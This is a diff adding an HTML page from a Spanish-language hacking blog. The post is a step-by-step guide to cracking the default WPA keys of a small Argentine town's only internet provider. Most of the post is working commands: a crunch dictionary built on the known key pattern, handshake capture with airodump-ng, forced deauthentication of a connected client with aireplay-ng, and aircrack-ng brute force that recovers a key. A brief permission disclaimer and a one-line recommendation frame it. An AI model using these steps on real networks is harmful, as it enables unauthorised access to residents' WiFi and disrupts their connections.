@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>WiFi Cooperativo en la aldea de montaña - BHF</title><meta name="Description" content="Hacking, sysadmin, beer."><meta property="og:title" content="WiFi Cooperativo en la aldea de montaña" />
+<meta property="og:description" content="WiFi Cooperativo en la aldea de montaña Esta prueba se realizó en un entorno controlado con los permisos de los clientes adjudicatarios de los dispositivos involucrados, con el fin único de reconocer el nivel de seguridad de acceso a los dispositivos wifi desde una perspectiva ética de investigación en InfoSec.
+Pasé tres semanas en San Martín de los Andes y noté que las claves WiFi por defecto del único proveedor de Internet tienen un patrón sumamente sencillo." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bhf.com.ar/wifialdea/" />
+<meta property="og:image" content="https://cdn.iconscout.com/icon/premium/png-256-thumb/hacker-81-1105283.png"/>
+<meta property="article:published_time" content="2021-01-13T00:00:00-03:00" />
+<meta property="article:modified_time" content="2021-01-13T00:00:00-03:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://cdn.iconscout.com/icon/premium/png-256-thumb/hacker-81-1105283.png"/>
+
+<meta name="twitter:title" content="WiFi Cooperativo en la aldea de montaña"/>
+<meta name="twitter:description" content="WiFi Cooperativo en la aldea de montaña Esta prueba se realizó en un entorno controlado con los permisos de los clientes adjudicatarios de los dispositivos involucrados, con el fin único de reconocer el nivel de seguridad de acceso a los dispositivos wifi desde una perspectiva ética de investigación en InfoSec.
+Pasé tres semanas en San Martín de los Andes y noté que las claves WiFi por defecto del único proveedor de Internet tienen un patrón sumamente sencillo."/>
+<meta name="application-name" content="BHF">
+<meta name="apple-mobile-web-app-title" content="BHF"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://bhf.com.ar/wifialdea/" /><link rel="prev" href="https://bhf.com.ar/bypasss-ssl-android-flutterapp-2/" /><link rel="next" href="https://bhf.com.ar/write-shellcode/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "WiFi Cooperativo en la aldea de montaña",
+        "inLanguage": "es",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/bhf.com.ar\/wifialdea\/"
+        },"image": {
+                "@type": "ImageObject",
+                "url": "https:\/\/bhf.com.ar\/cover.png",
+                "width":  800 ,
+                "height":  600 
+            },"genre": "posts","keywords": "wifi, aircrack, brute force","wordcount":  719 ,
+        "url": "https:\/\/bhf.com.ar\/wifialdea\/","datePublished": "2021-01-13T00:00:00-03:00","dateModified": "2021-01-13T00:00:00-03:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                "@type": "Organization",
+                "name": "xxxx",
+                "logo": {
+                "@type": "ImageObject",
+                "url": "https:\/\/bhf.com.ar\/logo.png",
+                "width":  127 ,
+                "height":  40 
+                }
+            },"author": {
+                "@type": "Person",
+                "name": "bronxi"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="BHF"><span class="header-title-pre"><i class='fas fa-laptop fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categorias </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Buscar">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Limpiar">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="BHF"><span class="header-title-pre"><i class='fas fa-laptop fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Buscar">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Limpiar">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancelar
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categorias</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contenido</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">WiFi Cooperativo en la aldea de montaña</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>bronxi</a></span>&nbsp;<span class="post-category">incluido en <a href="/categories/wifi/"><i class="far fa-folder fa-fw"></i>wifi</a>&nbsp;<a href="/categories/brute-foce/"><i class="far fa-folder fa-fw"></i>brute foce</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="01-13-2021">01-13-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;719 palabras&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;4 minutos&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading/normal.min.svg"
+        data-src="/images/wifialdea/wifipass.png"
+        data-srcset="/images/wifialdea/wifipass.png, /images/wifialdea/wifipass.png 1.5x, /images/wifialdea/wifipass.png 2x"
+        data-sizes="auto"
+        alt="/images/wifialdea/wifipass.png"
+        title="/images/wifialdea/wifipass.png" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contenido</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#instalar-crunch--dictionary">Instalar crunch &amp; dictionary</a></li>
+    <li><a href="#instalar-aircrack">Instalar aircrack</a></li>
+    <li><a href="#our-wifi-interface">Our WiFi Interface</a></li>
+    <li><a href="#monitor-mode">Monitor Mode</a></li>
+    <li><a href="#redes-wifi-en-nuestro-aire">Redes WiFi en nuestro aire</a></li>
+    <li><a href="#escuchando-por-un-handshake">Escuchando por un handshake</a></li>
+    <li><a href="#deauntenticar-al-cliente">Deauntenticar al cliente</a></li>
+    <li><a href="#brute-force-final">Brute force final</a></li>
+    <li><a href="#recomendaciones">Recomendaciones:</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="wifi-cooperativo-en-la-aldea-de-montaña">WiFi Cooperativo en la aldea de montaña</h1>
+<p><em>Esta prueba se realizó en un entorno controlado con los permisos de los clientes adjudicatarios de los dispositivos involucrados, con el fin único de reconocer el nivel de seguridad de acceso a los dispositivos wifi desde una perspectiva ética de investigación en InfoSec.</em></p>
+<p>Pasé tres semanas en San Martín de los Andes y noté que las claves WiFi por defecto del único proveedor de Internet tienen un patrón sumamente sencillo. Poseen 8 dígitos y todas comienzan con los mismos cuatro caracteres y los últimos 4 son alfanuméricos aleatorios. Por lo que existen solamente 1679616 posibilidas. Para generar un diccionario con dichas líneas, utilizaré la herramienta crunch.</p>
+<h2 id="instalar-crunch--dictionary">Instalar crunch &amp; dictionary</h2>
+<p>Pueden intalarla en cualquier distribución Debian con el siguiente comando (Kali ya lo trae):</p>
+<blockquote>
+<p>sudo apt-get install -y crunch</p>
+</blockquote>
+<p>El comando para crear este diccionario es muy sencillo</p>
+<blockquote>
+<p>crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -t cote@@@@ -o cotexxxx.txt</p>
+</blockquote>
+<p>El primer 8 es el mínimo de caracteres de las claves y el segundo 8 el máximo de caracteres. Aquí solo necesitamos claves de 8 caracteres.
+El string &ldquo;abcdefghijklmnopqrstuvwxyz0123456789&rdquo; que le sigue determina los caracteres a utilizar para la porción aleatoria de las claves.
+La opción &ldquo;-t&rdquo; especifica un patrón para los caracteres aleatorios. En este caso es @, que se trata de minúsculas y también tomará los números que hemos indicado anteriormente. A esto le sigue la estructura del patrón &ldquo;cote@@@@&rdquo;. Las @s serán los caracteres reemplazados por todas las variantes de la a a la z y del 0 al 9.
+La opción &ldquo;-o&rdquo; indica la salida. Nombramos el archivo como nos guste.</p>
+<p><strong>Ahora contamos con un diccionario que contiene todas las claves por defecto de la ciudad</strong></p>
+<p>El siguiente paso es conseguir el archivo que contenga el handshake cifrado de la red WiFi. Para ello utilizamos aircrack-ng.</p>
+<h2 id="instalar-aircrack">Instalar aircrack</h2>
+<p>Para instalarlo en cualquier versión Debian (Kali también lo trae):</p>
+<blockquote>
+<p>sudo apt install aircrack-ng</p>
+</blockquote>
+<h2 id="our-wifi-interface">Our WiFi Interface</h2>
+<p>Nos fijamos el nombre de nuestra placa con ifconfig</p>
+<blockquote>
+<p>ifconfig</p>
+</blockquote>
+<blockquote>
+<p>wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+inet 192.168.1.38  netmask 255.255.255.0  broadcast 192.168.1.255
+inet6 fa80::4g23:98l6:ka0:3436  prefixlen 64  scopeid 0x20<link>
+ether 59:96:1b:95:b0:2d  txqueuelen 1000  (Ethernet)
+RX packets 275495  bytes 308923532 (308.9 MB)
+RX errors 0  dropped 0  overruns 0  frame 0
+TX packets 103650  bytes 21966607 (21.9 MB)
+TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</p>
+</blockquote>
+<p>Antes de comenzar realizamos un check kill para evitar cualquier conflicto.</p>
+<blockquote>
+<p>sudo airmon-ng check kill</p>
+</blockquote>
+<h2 id="monitor-mode">Monitor Mode</h2>
+<p>Luego ponemos nuestra placa wifi en modo monitos:</p>
+<blockquote>
+<p>sudo airmon-ng start wlan0</p>
+</blockquote>
+<h2 id="redes-wifi-en-nuestro-aire">Redes WiFi en nuestro aire</h2>
+<p>Escaneamos las redes:</p>
+<blockquote>
+<p>sudo airodump-ng start wlan0mon</p>
+</blockquote>
+<h2 id="escuchando-por-un-handshake">Escuchando por un handshake</h2>
+<p>Una vez elegido el accesspoint al que queremos acceder, con ctrl + c detenemos el escaneo y nos pondremos a la escucha del accesspoint seleccionado:</p>
+<blockquote>
+<p>sudo airodump-ng -c 6 -b 00:01:12:56:32:56 -w nombredelarchivocondatosescuchados wlan0mon</p>
+</blockquote>
+<p>Acá &ldquo;-w&rdquo; indica el nombre del archivo en el que se guardarán los datos capturados. &ldquo;-c&rdquo; indica en canal por el que trabaja el accesspoint. &ldquo;-b&rdquo; indica la MAC del accesspoint (BSSID). Por último, la interface que usamos, en este caso &ldquo;wlan0mon&rdquo;. Al darle enter comenzará a escuchar ese accesspoint.</p>
+<p>Veremos la cantidad de paquetes capturados y perdidos. En al parte inferior de la terminal, se observan los clientes conectados al accesspoint, elegimos uno para deantenticar y obtener el handshake (paquete que contiene la clave WiFi encriptada).</p>
+<h2 id="deauntenticar-al-cliente">Deauntenticar al cliente</h2>
+<p>Mientras el proceso anterior continúa corriendo, en otra terminal realizamos una deautenticación del cliente con los datos copiados. Es decir, del BSSID (accesspoint) y de una STATION (cliente).</p>
+<blockquote>
+<p>aireplay-ng -0 10 -a 00:01:12:56:32:56 -c 00:00:10:A0:05:06 wlan0mon</p>
+</blockquote>
+<p>Acá &ldquo;-0&rdquo; indica la orden deauntenticar. &ldquo;-a&rdquo; la MAC del accesspoint. &ldquo;-c&rdquo; la MAC del cliente a deauntenticar. Por último, la interfaz que utilizamos en modo monitor, en este caso &ldquo;wlan0mon&rdquo;.</p>
+<p>Al conseguir el handshake, se notificará en la terminal que está escuchando, abierta en el punto <em>Escuchando por un handshake</em> Se obersva el mensaje en la parte superior derecha.</p>
+<p>Verán algo así:</p>
+<p><figure><a class="lightgallery" href="/images/wifialdea/handshake.png" title="Handshake" data-thumbnail="/images/wifialdea/handshake.png" data-sub-html="<h2>Handshake</h2><p>Handshake</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/wifialdea/handshake.png"
+            data-srcset="/images/wifialdea/handshake.png, /images/wifialdea/handshake.png 1.5x, /images/wifialdea/handshake.png 2x"
+            data-sizes="auto"
+            alt="Handshake" />
+    </a><figcaption class="image-caption">Handshake</figcaption>
+    </figure></p>
+<h2 id="brute-force-final">Brute force final</h2>
+<p>Por último, utilizamos fuerza bruta para probar todas las claves del diccionario sobre el archivo que contiene el handshake con el siguiente comando:</p>
+<blockquote>
+<p>sudo aircrack-ng -w cotexxxx.txt -b 00:01:12:56:32:56 nombredelarchivocondatosescuchados.cap</p>
+</blockquote>
+<blockquote>
+<p>KEY FOUND! [ cotefr33 ]</p>
+</blockquote>
+<h2 id="recomendaciones">Recomendaciones:</h2>
+<ul>
+<li>Generar claves de diez caracteres en la que todos sus caracteres sean aleatorios.</li>
+</ul>
+<p>¡Disfruten el lago, la montaña y un WiFi seguro!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Actualizado el 01-13-2021</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Compartir en Blogger" data-sharer="blogger" data-url="https://bhf.com.ar/wifialdea/" data-title="WiFi Cooperativo en la aldea de montaña" data-description=""><i class="fab fa-blogger fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/wifi/">wifi</a>,&nbsp;<a href="/tags/aircrack/">aircrack</a>,&nbsp;<a href="/tags/brute-force/">brute force</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Regresar</a></span>&nbsp;|&nbsp;<span><a href="/">Inicio</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/bypasss-ssl-android-flutterapp-2/" class="prev" rel="prev" title="Bypaseando la verificación SSL en una app de flutter en Android. Parte 2)"><i class="fas fa-angle-left fa-fw"></i>Bypaseando la verificación SSL en una app de flutter en Android. Parte 2)</a>
+            <a href="/write-shellcode/" class="next" rel="next" title="Escribiendo tu propia shellcode. Parte 1">Escribiendo tu propia shellcode. Parte 1<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Provisto por <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.74.3">Hugo</a> | Tema - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.9"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Volver arriba">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="Ver comentarios">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css"><style>.lg-toolbar .lg-icon::after { color: #999; }</style><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.es.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.0/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.1.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.0.1/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copiar al portapapeles","maxShownLines":10},"comment":{},"data":{"id-1":"# /home/BHF","id-2":"# /home/BHF"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"es","maxResultLength":10,"noResultsFound":"No se encontraron resultados","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
